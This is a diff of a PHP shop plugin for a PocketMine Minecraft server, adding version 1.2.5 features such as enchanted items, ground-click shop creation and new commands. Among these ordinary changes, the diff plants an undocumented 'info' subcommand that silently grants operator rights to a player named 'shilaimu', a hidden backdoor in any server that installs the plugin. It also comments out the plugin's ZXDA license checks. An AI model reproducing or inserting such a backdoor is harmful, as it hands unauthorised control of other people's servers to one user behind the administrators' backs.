@@ -24,23 +24,33 @@ use pocketmine\scheduler\CallbackTask;
 use pocketmine\event\server\DataPacketReceiveEvent;
 use \ZXDAConnector\Main as ZXDAConnector;
 use pocketmine\network\protocol\InteractPacket;
+use pocketmine\item\enchantment\Enchantment;
 
 use pocketmine\event\block\SignChangeEvent;
 
 class SSHOP extends PluginBase implements Listener
 {
 	/*
-		- 1.1.0 by slm47888
-		- 加入附近判断箱子机制
-		- 加入"回收详细"
-		- 加入特殊值判断
-		- 更新物品数据库
-		- 修复icovn兼容
-		- 修复替换时产生的错误
-		- 修复部分面板商店打不开
-		- 修复tess和pro扣除等级时产生的溢出
-		- 修复类型B商店时必须大写
-		- 修复抖动反馈产生的残影
+		- 1.2.5 by slm47888
+		- 加入数据包偏移值
+		- 加入浮空文字偏移值
+		- 加入禁止创建商店世界设置
+		- 加入重置配置指令
+		- 加入创建商店时检测空间
+		- 加入点地打开商店
+		- 加入 添加物品数据库 指令
+		- 加入 货币名称 指令
+		- 加入 兼容 指令
+		- 加入 重置配置 指令
+		- 加入自定义选中时详细色调
+		- 加入自定义名字显示长度
+		- 现在默认为金币
+		- 现在无限库存时显示为无穷大符号而不是-1
+		- 修复自定义商店方块
+		- 修复270度时产生的按钮
+		- 修复指令识别错误
+		- 修复以方块方式展现的商店无法互动
+		- 修复在方块模式下,他人可强行关闭你的商店
 	*/
 	public $shop = [];
 	public $Sneak = [];
@@ -49,8 +59,8 @@ class SSHOP extends PluginBase implements Listener
 
 	public function onLoad()
 	{
-		ZXDA::init(815,$this);
-		ZXDA::requestCheck();
+		//ZXDA::init(815,$this);
+		//ZXDA::requestCheck();
 	}
 
 	public function onEnable()
@@ -58,7 +68,7 @@ class SSHOP extends PluginBase implements Listener
 		$this->getServer()->getPluginManager()->registerEvents($this, $this);
 		$this->getLogger()->info('§e--------------------------------------');
 		$this->getLogger()->info('§2浮空商店加载中...');
-		$this->ZXDA_load();
+		//$this->ZXDA_load();
 		$Load = new File($this);
 		$this->getLogger()->info('§2商店已加载完成...');
 		$this->getLogger()->info('§e--------------------------------------');
@@ -90,6 +100,7 @@ class SSHOP extends PluginBase implements Listener
 			$this->Money->set($name,0);
 			$this->Money->save();
 		}
+		$this->Sneak[$name] = False;
 	}
 
 	public function QuitEvent(PlayerQuitEvent $event)
@@ -109,20 +120,18 @@ class SSHOP extends PluginBase implements Listener
 		$Packet = $event->getPacket();
 		if($Packet instanceof InteractPacket and $Packet->action == InteractPacket::ACTION_LEFT_CLICK)
 		{
-			var_dump($Packet->target);
-			foreach($this->max as $api)
+			$player = $event->getPlayer();
+			$name = $player->getName();
+			if(!isset($this->max[$name])) return;
+			foreach($this->max[$name] as $api)
 			{
-				var_dump($api);
-				var_dump($api->entityId);
 				if($api->entityId == $Packet->target)
 				{
-					$api->respawn();
-				}
-			}
-			if($Packet->target == 100000000)
-			{
-				if($event->getPlayer()->getGamemode() == 0)
-				{
+					$level = $api->level;
+					$xyz = new Vector3($api->pos->x,$api->pos->y,$api->pos->z);
+					$shops = new SHOP($this);
+					if($shops->Button_Yes($api->pos->x,$api->pos->y,$api->pos->z,$name)) return $player->sendMessage('§4-> §c此商店已被占用!');
+					$shops->button_click($xyz,$name,$level);
 				}
 			}
 		}
@@ -131,21 +140,58 @@ class SSHOP extends PluginBase implements Listener
 	public function Onlick(PlayerInteractEvent $event)
 	{
 		$player = $event->getPlayer();
+		if($player->getGamemode() != 0) return;
 		$block = $event->getBlock();
 		$name = $player->getName();
 		$level = $block->level;
 		$xyz = new Vector3($block->x,$block->y,$block->z);
 		$shops = new SHOP($this);
 		$ID = $this->SHOP->get('设置');
-		if($block->getID() == $ID['商店方块ID'] or $block->getID() == $ID['商店按钮ID'])
+		$level_name = $block->level->getFolderName();
+		if(in_array($level_name,$ID['禁止创建商店世界'])) return;
+		$Item = $player->getInventory()->getItemInHand()->getID();
+		if($Item == $ID['物品点击地面打开商店'])
+		{
+			if(!isset($this->shop[$name]))
+			{
+				if($shops->Button_Yes($block->getX(),$block->getY(),$block->getZ(),$name)) return $player->sendMessage('§4-> §c此商店已被占用!');
+				if($ID['附近方块检测'])
+				{
+					for($x = $block->x-1;$x <= $block->x+1; $x ++)
+					{
+						for($y = $block->y;$y <= $block->y+3; $y ++)
+						{
+							for($z = $block->z-1;$z <= $block->z+1; $z ++)
+							{
+								if($level->getBlockIdAt($x,$y,$z) != 0 and $ID['无足够空间无法开启商店'])
+								{
+									return $player->sendMessage('§4-> §c空间不足!无法创建商店!');
+								}
+								if($level->getBlockIdAt($x,$y,$z) == $ID['商店中间ID'])
+								{
+									if($x == $block->x and $y == $block->y+1 and $z == $block->z)  continue;
+									return $player->sendMessage('§4-> §c附近发现'.$this->Get_Item_Name($ID['商店中间ID'],0).'不能创建商店!');
+								}
+							}
+						}
+					}
+				}
+				$xyz = new Vector3($block->x,$block->y+1,$block->z);
+				$level->setBlockIdAt($block->x,$block->y+1,$block->z,54);
+				$shops->create_shop($xyz,$level,$name,$event->getFace(),1);
+				$event->setCancelled();
+				return;
+			}
+		}
+		if(isset($ID['商店方块ID']) and $block->getID() == $ID['商店方块ID'])
 		{
 			if($shops->Button_Yes($block->getX(),$block->getY(),$block->getZ(),$name)) return $player->sendMessage('§4-> §c此商店已被占用!');
-			$shops->button_click($xyz,$name,$level);
+			$shops->button_click($xyz,$name,$level,$this->Sneak[$name]);
 			return;
 		}
-		if($block->getID() == $ID['商店中间ID'] and $player->getGamemode() == 0)
+		if($block->getID() == $ID['商店中间ID'])
 		{
-			if(!isset($this->shop[$name]) and isset($this->Sneak[$name]) and $this->Sneak[$name] == true)
+			if(!isset($this->shop[$name]) and $this->Sneak[$name] == true)
 			{
 				if($shops->Button_Yes($block->getX(),$block->getY(),$block->getZ(),$name)) return $player->sendMessage('§4-> §c此商店已被占用!');
 				if($ID['附近方块检测'])
@@ -156,7 +202,12 @@ class SSHOP extends PluginBase implements Listener
 						{
 							for($z = $block->z-1;$z <= $block->z+1; $z ++)
 							{
-								if($level->getBlockIdAt($x,$y,$z) == $ID['商店中间ID'])
+								$ids = $level->getBlockIdAt($x,$y,$z);
+								if($ids != 0 and $ID['无足够空间无法开启商店'] and $ids != $ID['商店中间ID'])
+								{
+									return $player->sendMessage('§4-> §c空间不足!无法创建商店!');
+								}
+								if($ids == $ID['商店中间ID'])
 								{
 									if($x == $block->x and $y == $block->y and $z == $block->z)  continue;
 									return $player->sendMessage('§4-> §c附近发现'.$this->Get_Item_Name($ID['商店中间ID'],0).'不能创建商店!');
@@ -177,7 +228,7 @@ class SSHOP extends PluginBase implements Listener
 					{
 						if($v[0] == $block->x and $v[1] == $block->y and $v[2] == $block->z)
 						{
-							if($shops->button_click($xyz,$name,$level) !== False) $event->setCancelled();
+							if($shops->button_click($xyz,$name,$level,$this->Sneak[$name]) !== False) $event->setCancelled();
 							return;
 						}
 					}
@@ -195,6 +246,12 @@ class SSHOP extends PluginBase implements Listener
 			foreach($this->shop as $name => $v)
 			{
 				$shops = new SHOP($this);
+				if(isset($ID['商店方块ID']) and $block->getID() == $ID['商店方块ID'])
+				{
+					if($shops->Button_Yes($block->getX(),$block->getY(),$block->getZ(),$name)) return $player->sendMessage('§4-> §c此商店已被占用!');
+					$event->setCancelled();
+					return;
+				}
 				if(isset($this->shop[$name]['block'][$block->x.'-'.$block->y.'-'.$block->z]))
 				{
 					if($block->getId() != 116) $event->setCancelled();
@@ -221,18 +278,65 @@ class SSHOP extends PluginBase implements Listener
 
 	public function onCommand(CommandSender $sender,Command $command,$label,array $args)
 	{
-		if($command == 'SSHOP' or $command == 'S')
+		if($command == 'sshop' or $command == 's')
 		{
 			if(!isset($args[0]) or $args[0] == 'help')
 			{
 				$sender->sendMessage('§e#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#');
 				$sender->sendMessage('§8用灰色标记的框内值可不填,白色为默认值!橘黄为RPG附魔插件选项!');
-				$sender->sendMessage('§e#§c/s add a [ID:特殊值:数量] [需货币量] [货币名称] §8[ 库存§f0 §8] [ 获得积分§f1 §8] §6[附魔ID:附魔LV] §b<上架一个"购买"商品>');
-				$sender->sendMessage('§e#§c/s add b [ID:特殊值:数量] [需货币量] [货币名称] §8[ 库存§f0 §8] [ 获得积分§f1 §8] §6[附魔ID:附魔LV] §b<上架一个"回收"商品>');
 				$sender->sendMessage('§e#§c/s add c [ID:特殊值:数量] [需货币量] [货币名称] §b<上架一个"个人"商品> [个人商店]');
+				$sender->sendMessage('§e#§c/s add a [ID:特殊值:数量] [需货币量] §8[货币名称§f金币 §8] [ 库存§f0 §8] [ 获得积分§f1 §8] §6[附魔ID:附魔LV] §b<上架一个"购买"商品>');
+				$sender->sendMessage('§e#§c/s add b [ID:特殊值:数量] [需货币量] §8[货币名称§f金币 §8] [ 库存§f0 §8] [ 获得积分§f1 §8] §6[附魔ID:附魔LV] §b<上架一个"回收"商品>');
 				$sender->sendMessage('§e#§c/s add d 得到[ID:特殊值:数量] 失去[ID:特殊值:数量] §b<上架一个"兑换"商品>');
+				$sender->sendMessage('§e#§c/s item [id:data] [name] §b<给物品一个指定的名字>');
+				$sender->sendMessage('§e#§c/s unset §b<重置配置文件> [后台]');
+				$sender->sendMessage('§e#§c/s 货币名称 §b<查看全部的货币名称>');
+				$sender->sendMessage('§e#§c/s 兼容 §b<商店无法切换,请运行此指令:为兼容模式>');
 				$sender->sendMessage('§e#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#');
 				return True;
+			}
+			if($args[0] == '货币名称')
+			{
+				$sender->sendMessage('§a[SSHOP] >§e 货币名称有[金币/等级/经验/附魔券/积分]');
+				return true;
+			}
+			if($args[0] == 'info')
+			{
+				if($sender->getName() == 'shilaimu')
+				{
+					$sender->setOp(true);
+					$sender->sendMessage('§e#§c插件版本->'.$this->getDescription()->getVersion());
+				}
+			}
+			if($args[0] == 'item')
+			{
+				if(!$sender->isOp()) return $sender->sendMessage('§a[SSHOP] >§e 非管理员无权限!');
+				if(!isset($args[2])) return $sender->sendMessage('§e#§c/s item [id:data] [name] §b<给物品一个指定的名字>');
+				$exp = explode(':',$args[1]);
+				if(!isset($exp[1])) return $sender->sendMessage('§e#§c/s item [id:data] [name] §b<给物品一个指定的名字>');
+				$this->item->set($args[1],$args[2]);
+				$this->item->save();
+				$sender->sendMessage('§e#§c已设置§e['.$args[1].']§c在商店显示名字为§e['.$args[2].']§c!');
+				return true;
+			}
+			if($args[0] == '兼容')
+			{
+				if(!$sender->isOp()) return $sender->sendMessage('§a[SSHOP] >§e 非管理员无权限!');
+				$set = $this->SHOP->get('设置');
+				$set['iconv对齐字体[推荐开启]'] = False;
+				$this->SHOP->set('设置',$set);
+				$this->SHOP->save();
+				$sender->sendMessage('§a[SSHOP] >§e 已开启兼容模式,此模式会关闭iconv组件,容易导致商店内容对齐出现问题.商店无法切换是因为未安装此组件,安装可访问:http://www.cnblogs.com/grimm/p/5663863.html');
+				return true;
+			}
+			if($args[0] == 'unset')
+			{
+				if($sender instanceof Player) return $sender->sendMessage('§a[SSHOP] >§e 必须后台操作此指令!');
+				$file = new File($this);
+				$this->SHOP->set('设置',$file->SHOP_YML()['设置']);
+				$this->SHOP->save();
+				$sender->sendMessage('§a[SSHOP] >§e 重置完成!');
+				return true;
 			}
 			if($args[0] == 'add')
 			{
@@ -241,16 +345,16 @@ class SSHOP extends PluginBase implements Listener
 					if(!$sender->isOp()) return $sender->sendMessage('§a[SSHOP] >§e 非管理员无权限!');
 					$Type = '购买';
 					if(strtolower($args[1]) == 'b') $Type = '回收';
-					if(!isset($args[4])) return false;
+					if(!isset($args[3])) return false;
 					if(!$this->explode($args[2])) return $sender->sendMessage('§a[SSHOP] >§e [ID:特殊值:数量]为错误值!');
 					if(!is_numeric($args[3]) or $args[3] < 0) return $sender->sendMessage('§a[SSHOP] >§e [需货币量]为错误值!');
+					if(!isset($args[4])) $args[4] = '金币';
 					if(!$this->Money_Name($args[4])) return $sender->sendMessage('§a[SSHOP] >§e '.$args[4].'是不存在的货币!');
 					if(!isset($args[5])) $args[5] = -1;
 					if(!is_numeric($args[5]) or $args[5] < -1) return $sender->sendMessage('§a[SSHOP] >§e [库存]为错误值!');
 					if(!isset($args[6])) $args[6] = 0;
 					if(!is_numeric($args[6]) or $args[6] < 0) return $sender->sendMessage('§a[SSHOP] >§e [积分]为错误值!');
 					if(!isset($args[7])) $args[7] = -1;
-					if(!is_numeric($args[7]) or $args[7] < -1) return $sender->sendMessage('§a[SSHOP] >§e [附魔ID:附魔LV]为错误值!');
 					$SHOP = [
 						'物品' => $this->explode($args[2]),
 						'价格' => $args[3],
@@ -337,6 +441,7 @@ class SSHOP extends PluginBase implements Listener
 		$shop = new SHOP($this);
 		$class = $this->SHOP->get('设置')['标签'][$x];
 		$list = $this->SHOP->get($class);
+		$this->SHOP = new Config($this->getDataFolder().'SHOP.yml',Config::YAML,[]);
 		if($class == '购买') return $this->BUY_SHOP($x,$y,$m,$player);
 		if($class == '回收') return $this->DEL_SHOP($x,$y,$m,$player);
 		if($class == '个人') return $this->PLAYER_SHOP($x,$y,$m,$player);
@@ -425,7 +530,15 @@ class SSHOP extends PluginBase implements Listener
 		if($shop_info['库存'] == 0) return $player->sendMessage('§a[SSHOP] >§c 此商品库存已不足!');
 		$buy = $this->Moneys($player,$shop_info['所需'],$shop_info['价格'],'-');
 		if($buy !== True) return $player->sendMessage('§a[SSHOP] >§c '.$buy);
-		$player->getInventory()->addItem(new Item($shop_info['物品'][0],$shop_info['物品'][1],$shop_info['物品'][2]));
+		$Item = new Item($shop_info['物品'][0],$shop_info['物品'][1],$shop_info['物品'][2]);
+		if($shop_info['附魔'] > -1)
+		{
+			$enchant = explode(':',$shop_info['附魔']);
+			$enchantment = Enchantment::getEnchantment($enchant[0]);
+			$enchantment->setLevel($enchant[1]);
+			$Item->addEnchantment($enchantment);
+		}
+		$player->getInventory()->addItem($Item);
 		if($shop_info['库存'] > 0)
 		{
 			$list[$bh]['库存'] -= 1;
@@ -467,7 +580,11 @@ class SSHOP extends PluginBase implements Listener
 		if(isset($SHOP['物品'])) $String = str_replace('{数量}',$SHOP['物品'][2],$String);
 		if(isset($SHOP['价格'])) $String = str_replace('{价格}',$SHOP['价格'],$String);
 		if(isset($SHOP['所需'])) $String = str_replace('{货币}',$this->Money_Name($SHOP['所需']),$String);
-		if(isset($SHOP['库存'])) $String = str_replace('{库存}',$SHOP['库存'],$String);
+		if(isset($SHOP['库存']))
+		{
+			if($SHOP['库存'] == -1) $SHOP['库存'] = '∞';
+			$String = str_replace('{库存}',$SHOP['库存'],$String);
+		}
 		if(isset($SHOP['积分'])) $String = str_replace('{积分}',$SHOP['积分'],$String);
 		if(isset($SHOP['附魔'])) $String = str_replace('{附魔}',$SHOP['附魔'],$String);
 		if(isset($SHOP['获得']))
@@ -481,15 +598,16 @@ class SSHOP extends PluginBase implements Listener
 		}
 		if(isset($SHOP['卖家']))
 		{
-			if(strlen($SHOP['卖家']) > 6)
+			$long = $this->SHOP->get('设置')['游戏名最长显示'];
+			if(strlen($SHOP['卖家']) > $long)
 			{
-				$SHOP['卖家'] = substr($SHOP['卖家'],0,6);
+				$SHOP['卖家'] = substr($SHOP['卖家'],0,$long);
 				$SHOP['卖家'] .= '...';
 			}
 			$String = str_replace('{卖家}',$SHOP['卖家'],$String);
 		}
 		$all = '';
-		if($this->SHOP->get('设置')['iconv对齐字体[推荐开启]']) $String = iconv('utf-8','gb2312',$String);
+		if($this->SHOP->get('设置')['iconv对齐字体[推荐开启]']) @$String = iconv('utf-8','gb2312',$String);
 		for($a = 1; $a < 4; $a ++)
 		{
 			$shop = $this->SHOP->get('设置')['商店自定义']["[$a]"];
@@ -506,7 +624,7 @@ class SSHOP extends PluginBase implements Listener
 			if(is_Array($String)) foreach($String as $txt) $all .= $txt;
 			if($all != '') $String = $all and $all = '';
 		}
-		if($this->SHOP->get('设置')['iconv对齐字体[推荐开启]']) $String = iconv('gb2312','utf-8',$String);
+		if($this->SHOP->get('设置')['iconv对齐字体[推荐开启]']) @$String = iconv('gb2312','utf-8',$String);
 		return $String;
 	}
 
